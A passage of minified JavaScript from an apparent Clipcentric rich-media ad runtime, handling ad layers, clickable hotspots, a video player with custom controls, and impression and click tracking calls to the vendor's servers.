          m ? (ae[a] = !0, p.position = "relative", p.display = "inline-block", p.cursor = "pointer", p.zIndex = 4E3, r.zIndex = 100, r.overflow = "hidden", ra[1] || (c = Ca(), c.style.visibility = "hidden", c.style.zIndex = -1, c.innerHTML = "&nbsp;", I(b, c)), f[0] = !0) : (p.position = "absolute", p.zIndex = 100 + h, p.overflow = "hidden", K(a, !1), "number" === typeof t ? z(t) && (I(z(t)[q], b), c[57] = ca(t)) : /(view|page)/.test(t) && (p.zIndex = 25E5 + h, "page" !== t && (p.position = Ue ? "absolute" : "fixed"), I(ma, b, $g(a, ma)), c[57] = t));
          if (m) {
            var x = g[22];
            var w = Oa[0];
            bb || (w += "%20Alt", g[21] && (n = Za(g[21]), e = "image", g[23] && (x = g[23])));
            x = (f = df(x)) ? f : "$adtag_url" === x || "url" === x ? Wc ? Wc : "https://www.mesfire.com/request-service" : "$default_url" === x ? "https://www.mesfire.com/request-service" : "";
          }
          "image" === e && (f = Ca("img"), m && (f.src = n), f.draggable = !1, n = f.style, n.width = n.height = "100%", n.left = n.top = "0px", n.position = "absolute", 0 < (U & 390) && Dc(f, "translateZ(0)"), I(l, f), k[2] = f, m && x && (f.onclick = function () {
            na("cl:" + w + ",ii", x);
          }));
          "video" === e && wi(a);
          "canvas" === e && (Kh(a), m && la(je, 0, a));
          "frame" === e && xi(a);
          "button" === e && Wh(a);
          bb && Zg(a);
          m && Ya(a, !0);
          ui(d);
          return b;
        }
      }
    },
    Zg = function (a) {
      var b;
      var c = z(a);
      var e = D(a);
      var d = [0, 1, 2, 3, 4, 5, 6, 7, 7, 9, 10, 11, 12, 13, 13, 15, 16, 17][a];
      var f = tg[d];
      e[59] && (e[59][0].style.display = "none");
      if (Qd[d]) Qd[d][0].style.display = "block", e[59] = Qd[d];else if (f && c) {
        e = e[59] = Qd[d] = [];
        c = c[1];
        d = Ca();
        var g = d.style;
        g.position = "absolute";
        g.top = g.left = "0px";
        g.width = g.height = "100%";
        g.pointerEvents = "none";
        e.push(d);
        for (b = 0; b < f.length; b++) {
          var k = Ca();
          g = k.style;
          g.backgroundColor = f[b][4];
          g.position = "absolute";
          g.pointerEvents = "auto";
          g.cursor = "pointer";
          g.opacity = "0.001";
          e.push(k);
          I(d, k);
          1 === a && 0 === b && qa(k, "click", function (h) {
            0 === (U & 1) && h.preventDefault && h.preventDefault();
            na("cl:expanded,ii", "$default_url");
          });
          2 === a && 0 === b && qa(k, "click", function (h) {
            0 === (U & 1) && h.preventDefault && h.preventDefault();
            na("cl:expanded,ii", "$default_url");
          });
          3 === a && 0 === b && qa(k, "click", function (h) {
            0 === (U & 1) && h.preventDefault && h.preventDefault();
            na("cl:collapsed,ii", "$default_url");
          });
          4 === a && 0 === b && qa(k, "click", function (h) {
            0 === (U & 1) && h.preventDefault && h.preventDefault();
            na("cl:collapsed,ii", "$default_url");
          });
          5 === a && 0 === b && qa(k, "click", function (h) {
            0 === (U & 1) && h.preventDefault && h.preventDefault();
            na("cl:video%20frame,ii", "$default_url");
          });
          6 === a && 0 === b && qa(k, "click", function (h) {
            0 === (U & 1) && h.preventDefault && h.preventDefault();
            na("cl:video%20frame,ii", "$default_url");
          });
          7 === a && 0 === b && qa(k, "click", function (h) {
            0 === (U & 1) && h.preventDefault && h.preventDefault();
            na("cl:Video,ii", "$default_url");
          });
          8 === a && 0 === b && qa(k, "click", function (h) {
            0 === (U & 1) && h.preventDefault && h.preventDefault();
            na("cl:Video,ii", "$default_url");
          });
        }
        I(c, d);
      }
    },
    yi = {},
    gb = {},
    nd = function (a, b) {
      var c;
      if (gb[a]) for (c = 0; c < gb[a].length; c++) try {
        gb[a][c]({
          type: a,
          data: b
        });
      } catch (e) {}
    },
    hh = function (a, b, c) {
      var e = {
        ns: yi,
        tag: J,
        replay: function () {
          pf();
        },
        replayUncapped: function () {
          pf(!0);
        },
        track: function (d, f) {
          d = "ce:" + encodeURIComponent(d);
          !0 === f && (d += ",ii");
          na(d);
        },
        click: function (d, f) {
          na("cl:" + (f ? encodeURIComponent(f) : Oa[b]) + ",ii", d);
        },
        clickLayerHotspot: function (d, f, g) {
          var k;
          d = mb(d);
          if (0 <= d && (f = 1 <= f ? f : 1, (d = D(d)) && d[59] && d[59].length >= f + 1)) for (g = g || {}, k = 0; k < Zb.length; k++) if (Zb[k][0] === d[59][f] && "click" === Zb[k][1]) try {
            return Zb[k][2](g), !0;
          } catch (h) {}
          return !1;
        },
        getClickTracker: function () {
          return "https://tr.clipcentric.com/d/" + rc + ec(!0) + "/E=cl:" + Oa[b] + ",ii/*" + cb;
        },
        getGeoInfo: function () {
          return new Promise(function (d, f) {
            ri("https://tr.clipcentric.com/g/" + rc + "/geo.js", function (g) {
              d(g);
            });
          });
        },
        replaceTrackMacro: function (d) {
          return dc(d);
        },
        resize: function () {
          xb();
        },
        open: function (d, f) {
          d = mb(d);
          0 <= d && Sa(d, 1, !f);
        },
        openAuto: function (d) {
          e.open(d, !0);
        },
        openUser: function (d) {
          e.open(d, !1);
        },
        close: function (d, f) {
          d = d ? mb(d) : S[b];
          0 <= d && va(d, 1, !f);
        },
        closeAuto: function (d) {
          e.close(d, !0);
        },
        closeUser: function (d) {
          e.close(d, !1);
        },
        abort: function (d) {
          d = d ? mb(d) : S[b];
          0 <= d && (va(d, 1, !1), d = Ha[d], O[d][4] = !0);
        },
        url: function (d) {
          d = mb(d);
          return 0 <= d && fa[d][9] ? Za(fa[d][9]) : null;
        },
        getLayer: function (d) {
          var f;
          d = mb(d);
          0 <= d && (f = z(d));
          return f ? f[0] : null;
        },
        getHotspots: function (d) {
          var f,
            g = mb(d);
          0 <= g && (d = z(g)) && (d = D(g)) && d[59] && (f = d[59].slice(1));
          return f || [];
        },
        insertLayer: function (d, f, g) {
          d = mb(d);
          0 <= d && (d = z(d)) && d[0] && (I(f, d[0], g), bh(), Yg());
        },
        videoCmd: function (d, f, g, k) {
          d = mb(d);
          if (0 <= d) return da(d, f, g, k);
        },
        getDataItem: function (d) {
          return "";
        },
        getFeedItem: function (d) {
          return e.getDataItem(d);
        },
        clientDataReady: function () {},
        hasClass: function (d, f) {
          return xf(d, f);
        },
        addClass: function (d, f) {
          d && void 0 !== d.className && !xf(d, f) && (fd.push([d, f]), d.className.length && (f = " " + f), d.className += f);
        },
        removeClass: function (d, f) {
          eh(d, f);
        },
        addStyle: function (d, f, g) {
          a: {
            g = c && !g ? a : null;
            var k,
              h = !1;
            if (g) {
              try {
                var l = g.document;
              } catch (p) {
                d = !1;
                break a;
              }
              var m = g._ccSnode;
            } else l = B, m = Ye;
            for (k = 0; 2 > k; k++) {
              if (0 < k) if (top === v || g) break;else try {
                l = top.document, m = Ze;
              } catch (p) {
                break;
              }
              m || (m = l.createElement("style"), I(m, l.createTextNode("")), I(l.head, m), g ? g._ccSnode = m : l === B ? Ye = m : Ze = m);
              var n = m.sheet;
              f || 0 === f || (f = n.cssRules.length);
              try {
                n.insertRule(d, f), h = !0;
              } catch (p) {}
            }
            d = h;
          }
          return d;
        },
        onAdUnload: function (d) {
          a: {
            var f;
            if (zc[2]) {
              var g = zc[2];
              for (f = 0; f < g.length; f++) if (g[f][0] === d && void 0 === g[f][1]) break a;
            } else zc[2] = [];
            zc[2].push([d, void 0]);
          }
        },
        enableSizing: function (d, f) {
          d = mb(d);
          return 0 <= d ? (d = D(d), d[72] = !f, !0) : !1;
        },
        getAdContainer: function () {
          var d;
          (d = Aa && "SCRIPT" === Aa.tagName ? Aa.parentNode : Aa) && "HEAD" === d.tagName && (d = d.ownerDocument.body);
          return d;
        },
        addEventListener: function (d, f) {
          var g;
          if (f) try {
            var k = d.toLowerCase();
            if (gb[k]) {
              var h = gb[k];
              for (g = 0; g < h.length; g++) if (h[g] === f) return;
            } else gb[k] = [];
            gb[k].push(f);
          } catch (l) {}
        },
        removeEventListener: function (d, f) {
          var g;
          try {
            var k = d.toLowerCase();
            if (gb[k]) if (void 0 === f) delete gb[k];else {
              var h = gb[k];
              for (g = 0; g < h.length; g++) h[g] === f && (h[g].splice(g, 1), g--);
            }
          } catch (l) {}
        },
        triggerEvent: function (d, f) {
          try {
            d = d.toLowerCase();
          } catch (g) {}
          nd(d, f);
        },
        setInternal: function (d, f, g) {},
        getInternal: function (d, f, g) {},
        getPlatformInfo: function () {
          var d = 1 === Z,
            f = !d,
            g = 0 < (Z & 8064),
            k = 2 === Ke;
          return {
            desktop: d,
            mobile: f,
            phone: g,
            tablet: f && !g,
            ios: 0 < (Z & 390),
            android: 0 < (Z & 1560),
            landscape: k,
            portrait: !k,
            safari: Je,
            amp: "a" === Eb,
            iframe: "i" === Eb,
            mraid: "m" === Eb,
            safeframe: "s" === Eb,
            vpaid: "v" === Eb,
            web: "w" === Eb,
            editor: !1,
            preview: !1,
            capped: !1,
            closed: !1,
            domain: Ta
          };
        }
      };
      return e;
    },
    zf = function (a, b, c, e) {
      e = [];
      var d = [],
        f;
      if (8 === a) {
        var g = 10;
        g === S[g] && (g = a + "percent100", (f = "status" === b && 3 === c) && !Jb[a][g] && (e = e.concat([9]), d = d.concat([]), Jb[a][g] = !0), "setPlayhead" !== b || f || (Jb[a][g] = !1));
      }
      7 === a && (g = 10, g === S[g] && (g = a + "percent100", (f = "status" === b && 3 === c) && !Jb[a][g] && (e = e.concat([9]), d = d.concat([]), Jb[a][g] = !0), "setPlayhead" !== b || f || (Jb[a][g] = !1)));
      for (a = 0; a < e.length; a++) Sa(e[a], 1);
      for (a = 0; a < d.length; a++) va(d[a], 1);
    },
    pe = Za("clipcentric-a.akamaihd.net"),
    ta = [],
    me = [],
    Ug = [],
    od = [],
    ih = [],
    Ba = [],
    jh = {},
    zb;
  ta[7] = {
    oh: 360,
    ow: 640,
    ccogvUrl: "/video/F=1684526/V=ad_480x270_w2400/T=1695836413/S=tJNpSwZc/",
    poster: "/file/1684526/ad_480x270_p0/1695836413/O193r1YM?f=auto",
    muted: 1,
    bg: "#000000",
    control: 1,
    dur: 27.03,
    auto: 1
  };
  me[7] = "B=193/F=1684526/R=1722688/C=1127574/P=22/S=RG6AUX5j";
  var kh = function (a) {
      if (!zb) {
        zb = {};
        var b = B.createElement("video");
        b.canPlayType("video/mp4") && (zb.mp4 = !0, 1 === U || b.canPlayType('video/mp4; codecs="avc1.64001E"')) && (zb.high = !0);
        b.canPlayType("video/webm") && (zb.webm = !0);
        b.canPlayType('video/mp4; codecs="hvc1"') && (zb.hevc = !0);
      }
      return a && zb.hevc ? "hevc.mp4" : a && zb.webm || Md ? "webm" : zb.high ? "high.mp4" : "mp4";
    },
    Fc = function (a, b) {
      Ka();
      var c = ca(a);
      if ($h.test(b)) {
        var e = ta[c] || {};
        if (e.isVpaid) var d = e.vpaidUrl || "";else e.isVastplayer ? (d = z(c)[3], d = d.src) : (d = Za(fa[c][9]), e.remote || (d += "." + kh(e.alpha)));
        e = b + ":" + Oa[a];
        0 === b.indexOf("vimp") && (gf(2, c), jh[d] || (e += ",vdownload:" + Oa[a], jh[d] = !0));
        a = "https://tr.clipcentric.com/s/" + me[c] + ec() + "/E=" + e + "/!" + d;
        b = b + ":" + c;
        Na.hasOwnProperty(b) ? Na[b]++ : Na[b] = 0;
        0 === Na[b] && (b = new Image(), b.src = a);
      }
    },
    lh = function (a, b) {
      var c, e, d;
      var f = z(a)[3];
      if (void 0 === b && !f.seeking) {
        try {
          b = f.currentTime / (f.ccDuration || f.duration);
        } catch (l) {}
        b || (b = 0);
      }
      b = Math.floor(20 * b);
      f = D(a);
      if (b > f[24]) {
        for (c = !f[25] || 2 >= b - f[24] ? f[24] + 1 : b; c <= b; c++) {
          if (0 === c % 2) var g = c >> 1;else if (5 === c || 15 === c) g = (c >> 1) + "p5";else continue;
          Fc(f[58], "vprogress_" + g);
          g = ca(a);
          g = ta[g];
          if (g.track || g.vast) {
            var k = "progress_" + 5 * c;
            if (e = g.track && g.track[k]) for (d = 0; d < e.length; d++) if (Bc(e[d])) {
              var h = new Image();
              h.src = dc(e[d]);
            }
            g.vast && !f[60] && (g.notrack || (g.notrack = {}), g.notrack[k] = !0);
          }
        }
        f[24] = b;
      }
      f[25] = !1;
    },
    ki = function () {
      var a,
        b = [7],
        c = [];
      if (!sc) {
        var e = b.length;
        for (a = 0; a < e; a++) {
          var d = b[a];
          if (sc) {
            if (!ta[d].as && !ta[d].at) continue;
          } else if (0 === (U & 384) && !ta[d].auto) continue;
          if (Rg(d)) {
            c.push(d);
            var f = D(d);
            var g = f[2];
            f[2] = g ? g + 1 : 1;
            ta[d].auto && (f[23] = 1, (g = z(d)[4]) && g.ccLayoutControl(2, 1, 0));
          }
        }
        if (0 !== c.length) if (a = B.createElement("SCRIPT"), a.type = "text/javascript", a.onload = function () {
          var k;
          var h = c.length;
          for (k = 0; k < h; k++) {
            var l = c[k];
            var m = ta[l].as || ta[l].at;
            var n = pe + ta[l].ccogvUrl + "video";
            var p = n + (m ? ".abs.ogv" : ".ogv");
            n = m ? "" : n + ".m4a";
            var r = z(l)[3];
            r.duration = ta[l].dur;
            v.CCOGV(p, n, r, {
              loadAll: m
            });
            p = D(l);
            p[2]--;
            0 === p[2] && Lc(l);
          }
        }, v.CCOGV) a.onload();else a.src = Ld + "ccogv.min.js?q=o33", I(B.getElementsByTagName("head")[0], a);
      }
    },
    wi = function (a) {
      var b = z(a),
        c = b[1],
        e;
      var d = ca(a);
      var f = ta[d];
      var g = D(a);
      g[58] = a;
      g[23] = f.muted ? 1 : 2;
      g[27] = .8;
      g = kh(f.alpha);
      if (f.progress) {
        a = Ca();
        var k = a.style;
        k.position = "absolute";
        k.left = k.bottom = "0px";
        k.height = f.pW + "px";
        k.width = "0%";
        k.backgroundColor = f.pC;
        k.pointerEvents = "none";
        k.zIndex = 2E3;
        Dc(a, "translateZ(0)");
        b[10] = a;
        I(c, a);
      }
      a = Ca();
      I(c, a);
      f.alpha || (a.style.backgroundColor = f.bg);
      sc || (e = 0 !== (U & 384) || f.auto ? !0 : !1);
      e ? (c = Ca("canvas"), I(a, c), b[2] = b[3] = c, R && v.CCOGV && (a = pe + f.ccogvUrl + "video", c.duration = f.dur, v.CCOGV(a + ".ogv", a + ".m4a", c))) : (c = Za(fa[d][9]), f.remote || (c += "." + g), b[2] = b[3] = b = Ca("video"), b.style.objectFit = "cover", b.preload = "none", g = 85 <= Le, f.poster && !g ? b.poster = pe + f.poster : 0 < (U & 1560) && (b.poster = "data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="), b.muted = !!f.muted, b.playsInline = !0, b.src = c, f.vtt && (e = B.createElement("track"), e.default = !0, b.crossOrigin = "anonymous", I(b, e), c = Za(f.vtt), mc ? M(b, "loadedmetadata", function (h, l) {
        return function () {
          h.src = l;
        };
      }(e, c)) : e.src = c), g && f.poster && (c = Ca("img"), e = c.style, c.id = "ccp", c.src = pe + f.poster, e.width = e.height = "100%", e.left = e.top = "0px", e.position = "absolute", e.objectFit = "cover", I(a, c)), I(a, b));
      f.control && zi(d);
      qc(d, !1, f.muted);
      Ai(d);
    },
    Ai = function (a) {
      var b = z(a);
      D(a);
      var c = b[1],
        e = b[3];
      M(e, "loadedmetadata", function (d) {
        d = e.duration;
        e.ccDuration = isFinite(d) && 1 !== d ? d : ta[a].dur;
      });
      M(e, "play", function (d) {
        d = D(a);
        6 !== d[22] && (d[26] || (d[26] = setInterval(lh, 100, a)), d = 0 <= ed ? ed : d[27], e.volume = Gc(d), d = D(a)[58], Fc(d, "vimpression"), na("vi"), zf(a, "impression"), gc(a, !1), mh(a, !1), qc(a, !0, e.muted));
      });
      M(e, "pause", function (d) {
        qc(a, !1, e.muted);
      });
      M(e, "volumechange", function (d) {
        qc(a, !e.paused, e.muted || 0 >= e.volume);
      });
      M(e, "waiting", function (d) {
        gc(a, !0);
      });
      M(e, "canplay", function (d) {
        gc(a, !1);
      });
      M(e, "playing", function (d) {
        gc(a, !1);
      });
      M(e, "ended", function (d) {
        nh(a);
      });
      qa(c, "mouseup", function (d) {
        D(a)[34] || da(a, "play", null, !0);
      });
      7 === a && (M(e, "pause", function (d) {
        d = D(a);
        4 !== d[22] && (K(b[5], !0), K(b[6], !1), B.activeElement === b[6] && b[5].focus());
        clearInterval(d[32]);
      }), M(e, "play", function (d) {
        d = D(a);
        4 !== d[22] && (K(b[5], !1), K(b[6], !0), B.activeElement === b[5] && b[6].focus());
        clearInterval(d[32]);
        d[32] = setInterval(function () {
          Af(a, "setPlayhead", e.currentTime / (e.ccDuration || e.duration));
        }, 10);
      }));
    },
    nh = function (a, b) {
      var c = z(a),
        e = D(a),
        d = ta[a];
      c = c[3];
      clearInterval(e[26]);
      e[26] = null;
      Af(a, "status", b ? 9 : 3, e[23]);
      d.rewind && (c.load(), c.poster = c.poster, Af(a, "setPlayhead", 0));
      qc(a, !1, c.muted);
    },
    Bf,
    Bi = function (a) {
      var b,
        c,
        e,
        d = [],
        f = [7];
      if (1 !== U && !Bf) {
        for (b = 0; 1 > b; b++) {
          var g = f[b];
          if (!d[g] && g !== a && (c = z(g)) && (c = c[2]) && "VIDEO" === c.tagName) {
            var k = D(g);
            1 === k[22] && !c.paused || k[34] || (k[22] = 6, c.muted = !0, (e = Hc(c, g)) ? e.then(function (h, l) {
              return function () {
                6 === l[22] && (l[22] = 2, h.pause(), 2 === l[23] && (h.muted = !1, h.volume = Gc(l[27])));
              };
            }(c, k)) : c.pause(), d[g] = !0);
          }
        }
        Bf = !0;
      }
    },
    oh = function (a) {
      var b = Ca();
      var c = b.style;
      c.position = "absolute";
      c.top = c.left = "0px";
      c.width = c.height = "100%";
      c.zIndex = 10;
      c.backgroundImage = "url(" + a + ")";
      c.backgroundRepeat = "no-repeat";
      c.backgroundPosition = "center center";
      c.backgroundSize = "contain";
      return b;
    },
    gc = function (a, b) {
      var c = D(a),
        e = Ld + "loader_p50.svgz?q=33";
      var d = ta[a];
      d.as || d.at || d.noloader || (b ? c[28] || (c[28] = la(function (f) {
        var g = z(f),
          k = g[1];
        D(f)[28] = null;
        g[9] || (g[9] = oh(e), I(k, g[9], k.firstChild));
      }, 500, a)) : (a = z(a), sa(c[28]), c[28] = null, eb(a[9]), a[9] = null));
    },
    mh = function (a, b) {
      var c = Ld + "play_p50.svgz?q=33";
      a = z(a);
      b ? a[11] || (a[11] = oh(c), b = a[11].style, b.opacity = .7, b.pointerEvent = "none", b = a[1], I(b, a[11], b.firstChild)) : a[11] && (eb(a[11]), a[11] = null);
    },
    Gc = function (a) {
      a = (Math.pow(10, a) - 1) / 9;
      isNaN(a) && (a = .8);
      0 > a && (a = 0);
      1 < a && (a = 1);
      return a;
    },
    ph = function (a) {
      if (32 === a.keyCode || 13 === a.keyCode) a.preventDefault(), a.stopImmediatePropagation(), a.currentTarget.click();
    },
    Ci = function (a) {
      return function (b) {
        var c, e;
        D(a);
        if (e = (c = z(a)) && c[3]) {
          c = e.currentTime / e.duration;
          if (37 === b.keyCode || 40 === b.keyCode) c = b.ctrlKey ? (e.currentTime - 5) / e.duration : b.shiftKey ? (e.currentTime - 1) / e.duration : (Math.round(10 * c) - 1) / 10;else if (38 === b.keyCode || 39 === b.keyCode) c = b.ctrlKey ? (e.currentTime + 5) / e.duration : b.shiftKey ? (e.currentTime + 1) / e.duration : (Math.round(10 * c) + 1) / 10;else return;
          b.preventDefault();
          b.stopImmediatePropagation();
          c = Math.max(0, c);
          c = Math.min(1, c);
          da(a, "setPlayhead", c, !0);
        }
      };
    },
    Di = function (a) {
      return function (b) {
        var c = -1;
        var e = D(a);
        var d = e[27];
        if (37 === b.keyCode || 40 === b.keyCode) 1 !== e[23] && (c = Math.max(0, (Math.round(10 * d) - 1) / 10));else if (38 === b.keyCode || 39 === b.keyCode) c = 1 === e[23] ? .1 : Math.min(1, (Math.round(10 * d) + 1) / 10);
        0 <= c && (b.preventDefault(), b.stopImmediatePropagation(), da(a, "setVolume", c, !0));
      };
    },
    hb = function (a, b, c, e, d, f) {
      var g = Ca(),
        k = g.style;
      k.width = c + "px";
      k.height = e + "px";
      k.top = b + "px";
      k.left = a + "px";
      k.position = "absolute";
      null !== d && (k.backgroundImage = "url('data:image/svg+xml;charset=utf-8,%3csvg%20xmlns%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%20version%3d%221.1%22%20width%3d%22416%22%20height%3d%2240%22%20enable-background%3d%22new%22%3e%3cpath%20d%3d%22m265%2020c-1.65685%200-3%201.343146-3%203l0%2014c0%201.656854%201.34315%203%203%203l14%200c1.65685%200%203-1.343146%203-3%200-1.656854-1.34315-3-3-3l-6.75%200%208.875-8.875C281.66789%2024.582107%20282%2023.828427%20282%2023c0-1.656854-1.34315-3-3-3-0.82842%200-1.5821%200.332106-2.125%200.875L268%2029.75%20268%2023c0-1.656854-1.34315-3-3-3z%22%20fill%3d%22%23fff%22%2f%3e%3cpath%20d%3d%22m331%200c-1.65685%200-3%201.343146-3%203l0%2014c0%201.656854%201.34315%203%203%203l14%200c1.65685%200%203-1.343146%203-3%200-1.656854-1.34315-3-3-3l-6.75%200%208.875-8.875C347.66789%204.582107%20348%203.828427%20348%203c0-1.656854-1.34315-3-3-3-0.82842%200-1.5821%200.332106-2.125%200.875L334%209.75%20334%203c0-1.656854-1.34315-3-3-3z%22%20fill%3d%22%23fff%22%2f%3e%3cpath%20d%3d%22m325%2040c1.65685%200%203-1.34315%203-3l0-14c0-1.65685-1.34315-3-3-3l-14%200c-1.65685%200-3%201.34315-3%203%200%201.65685%201.34315%203%203%203l6.75%200-8.875%208.875C308.33211%2035.41789%20308%2036.17157%20308%2037c0%201.65685%201.34315%203%203%203%200.82842%200%201.5821-0.33211%202.125-0.875L322%2030.25%20322%2037c0%201.65685%201.34315%203%203%203z%22%20fill%3d%22%23fff%22%2f%3e%3cpath%20d%3d%22m299%2020c1.65685%200%203-1.34315%203-3l0-14c0-1.65685-1.34315-3-3-3l-14%200c-1.65685%200-3%201.34315-3%203%200%201.65685%201.34315%203%203%203l6.75%200-8.875%208.875C282.33211%2015.41789%20282%2016.17157%20282%2017c0%201.65685%201.34315%203%203%203%200.82842%200%201.5821-0.33211%202.125-0.875L296%2010.25%20296%2017c0%201.65685%201.34315%203%203%203z%22%20fill%3d%22%23fff%22%2f%3e%3cpath%20d%3d%22m3.6052247%200.014609c-1.9436231%200.152-3.61087842%201.949999-3.6051004271%203.888598l0%2030.259787C-0.02407571%2036.889193%203.4914627%2038.928392%205.8660497%2037.565593L32.262714%2022.374999c2.316361-1.371199%202.316361-5.312598%200-6.683797L5.8660497%200.500608C5.184132%200.118609%204.3849723-0.053391%203.6052247%200.014609z%22%20fill%3d%22%23fff%22%2f%3e%3crect%20width%3d%2214%22%20height%3d%2238%22%20ry%3d%227%22%20x%3d%2238%22%20y%3d%220%22%20fill%3d%22%23fff%22%2f%3e%3crect%20width%3d%2214%22%20height%3d%2238%22%20ry%3d%227%22%20x%3d%2256%22%20y%3d%220%22%20fill%3d%22%23fff%22%2f%3e%3cpath%20d%3d%22M78%2012%2088%2012%2098%202%2098%2036%2088%2026%2078%2026z%22%20fill%3d%22%23fff%22%2f%3e%3cpath%20d%3d%22m146%202-5.75%205.75%205.625%205.5625%200.125-0.125%200-11.187595zm-20%2010%200%2014%207.1875%200%207-7-7-7L126%2012zm19.875%2012.687594-5.625%205.562398%205.75%205.75%200-11.25-0.125-0.062z%22%20fill%3d%22%23fff%22%2f%3e%3cg%20transform%3d%22matrix(1.4142302%2c-1.414213%2c1.4142302%2c1.414213%2c-1388.952%2c-1332.0853)%22%3e%3crect%20width%3d%222%22%20height%3d%2224%22%20x%3d%2264%22%20y%3d%221008.3622%22%20fill%3d%22%23fff%22%2f%3e%3crect%20width%3d%222%22%20height%3d%2224%22%20x%3d%22-1021.3622%22%20y%3d%2253%22%20transform%3d%22matrix(0%2c-1%2c1%2c0%2c0%2c0)%22%20fill%3d%22%23fff%22%2f%3e%3c%2fg%3e%3cpath%20d%3d%22m232%200%200%2020-60%200z%22%20fill%3d%22%23fff%22%2f%3e%3crect%20width%3d%2214%22%20height%3d%2232%22%20ry%3d%225%22%20x%3d%22241%22%20y%3d%223%22%20style%3d%22enable-background%3anew%3bfill%3a%23fff%3bstroke-width%3a2%3bstroke%3a%23000%22%2f%3e%3cpath%20d%3d%22m14-14a2%202%200%200%201-2%202%22%20transform%3d%22matrix(1.414213%2c-1.414213%2c1.414213%2c1.414213%2c103.37199%2c55.768193)%22%20style%3d%22enable-background%3anew%3bfill%3anone%3bstroke-linecap%3around%3bstroke%3a%23fff%22%2f%3e%3cpath%20d%3d%22m15-7a4%204%200%200%201-4%204%22%20transform%3d%22matrix(1.414213%2c-1.414213%2c1.414213%2c1.414213%2c94.886284%2c44.454598)%22%20style%3d%22enable-background%3anew%3bfill%3anone%3bstroke-linecap%3around%3bstroke%3a%23fff%22%2f%3e%3cpath%20d%3d%22M7-10A6%206%200%200%201%201-4%22%20transform%3d%22matrix(1.414213%2c-1.414213%2c1.414213%2c1.414213%2c113.27063%2c34.555002)%22%20style%3d%22enable-background%3anew%3bfill%3anone%3bstroke-linecap%3around%3bstroke%3a%23fff%22%2f%3e%3cpath%20d%3d%22m152.43799%2019.937008c0.14718-0.6096%200.15032-1.259199%200-1.874999%22%20style%3d%22enable-background%3anew%3bfill%3anone%3bstroke-linecap%3around%3bstroke-width%3a2%3bstroke%3a%23fff%22%2f%3e%3cpath%20d%3d%22m155.50049%2022.937007c1.37087-2.444399%201.3398-5.435998-0.0625-7.874997%22%20style%3d%22enable-background%3anew%3bfill%3anone%3bstroke-linecap%3around%3bstroke-width%3a2%3bstroke%3a%23fff%22%2f%3e%3cpath%20d%3d%22m158.37549%2025.812006c2.84506-4.110999%202.86548-9.592196%200-13.687595%22%20style%3d%22enable-background%3anew%3bfill%3anone%3bstroke-linecap%3around%3bstroke-width%3a2%3bstroke%3a%23fff%22%2f%3e%3cpath%20d%3d%22m378.79%2037.984c-5.618-0.101-10.453-0.371-11.899-0.665-1.827-0.371-3.2-1.077-4.279-2.199-1.371-1.426-1.963-3.007-2.187-5.835-0.387-4.896-0.423-5.804-0.425-10.944-0.002-5.069%200.011-5.426%200.322-8.765%200.214-2.303%200.429-3.357%200.921-4.516%201.022-2.408%203.037-3.921%205.938-4.459%201.216-0.225%204.02-0.416%207.823-0.533%202.947-0.09%2021.972-0.09%2024.95%200%205.412%200.164%207.695%200.383%209.239%200.886%202.318%200.756%203.996%202.426%204.774%204.753%200.412%201.232%200.609%202.664%200.899%206.519%200.178%202.371%200.18%209.608%200.002%2012.3-0.279%204.234-0.411%205.891-0.514%206.447-0.659%203.547-2.766%205.661-6.33%206.351-1.147%200.222-3.603%200.4-7.858%200.569-1.716%200.068-18.641%200.14-21.376%200.091l0%200zm-0.58-4.798c3.07-0.435%205.088-1.56%206.401-3.566%201.084-1.656%201.63-3.645%201.791-6.525l0.047-0.831c-2.364%200-4.728%200-7.092%200l0%200.524c0%201.991-0.987%203.476-2.586%203.892-0.777%200.202-1.807%200.114-2.439-0.208-0.972-0.495-1.717-1.508-1.984-2.698-0.34-1.514-0.413-5.893-0.136-8.154%200.305-2.492%201.325-3.839%203.111-4.11%202.155-0.326%203.937%201.352%204.15%203.91l0.046%200.553c2.303%200%204.606%200%206.909%200l-0.034-0.619c-0.2-3.612-1.043-6.06-2.678-7.78-1.861-1.956-4.675-2.842-8.347-2.625-4.367%200.257-7.06%201.888-8.681%205.258-1.208%202.51-1.706%205.609-1.603%209.972%200.107%204.558%200.805%207.528%202.301%209.79%200.615%200.93%201.811%201.959%202.789%202.4%201.017%200.459%202.461%200.792%203.987%200.919%200.997%200.083%203.117%200.029%204.049-0.103zm23.524-0.003c2.455-0.339%204.238-1.142%205.514-2.484%201.636-1.72%202.463-4.08%202.652-7.568l0.047-0.866c-2.356%200-4.713%200-7.07%200l-0.042%200.795c-0.023%200.437-0.094%200.97-0.159%201.184-0.391%201.297-1.352%202.227-2.562%202.478-0.567%200.118-1.521%200.052-2.017-0.139-1.291-0.497-2.09-1.677-2.361-3.484-0.236-1.576-0.25-5.64-0.026-7.479%200.303-2.487%201.327-3.84%203.111-4.11%202.155-0.326%203.937%201.352%204.15%203.91l0.046%200.553c2.309%200%204.619%200%206.928%200l-0.04-0.512c-0.041-0.917-0.164-1.85-0.296-2.715-0.897-4.903-3.795-7.486-8.749-7.796-2.38-0.149-4.913%200.245-6.552%201.02-3.164%201.496-4.996%204.695-5.586%209.756-0.154%201.323-0.176%205.44-0.037%206.857%200.473%204.808%201.781%207.742%204.146%209.302%201.166%200.769%202.762%201.231%204.859%201.406%200.994%200.083%203.053%200.028%204.041-0.109z%22%20fill%3d%22%23fff%22%2f%3e%3c%2fsvg%3e')", k.backgroundPosition = -d + "px 0px");
      f && (g.setAttribute("aria-label", f), g.setAttribute("tabindex", "0"), /(slider|seek)/.test(f) ? g.setAttribute("role", "slider") : (g.setAttribute("role", "button"), M(g, "keydown", ph)));
      return g;
    },
    zi = function (a) {
      var b = z(a),
        c = b[1],
        e,
        d = 0,
        f;
      7 === a && (f = !0);
      var g = ta[a];
      var k = D(a);
      g = !!g.muted;
      k = k[27];
      var h = 180;
      var l = hb(10, 136, h, 54, null);
      var m = l.style;
      m.borderRadius = "10px";
      m.backgroundColor = "#000000";
      m.opacity = .7;
      m.zIndex = 1048575;
      var n = hb(10, 8, 36, 40, 0, "play");
      qa(n, "click", function () {
        da(a, "play", null, !0);
      });
      var p = hb(10, 8, 36, 40, 38, "pause");
      K(p, !1);
      qa(p, "click", function () {
        da(a, "pause", null, !0);
      });
      if (0 < (Z & 390) || "CANVAS" === b[3].tagName) var r = !0;
      if (!f) {
        f = !0;
        try {
          top.alert && (f = !1);
        } catch (C) {}
      }
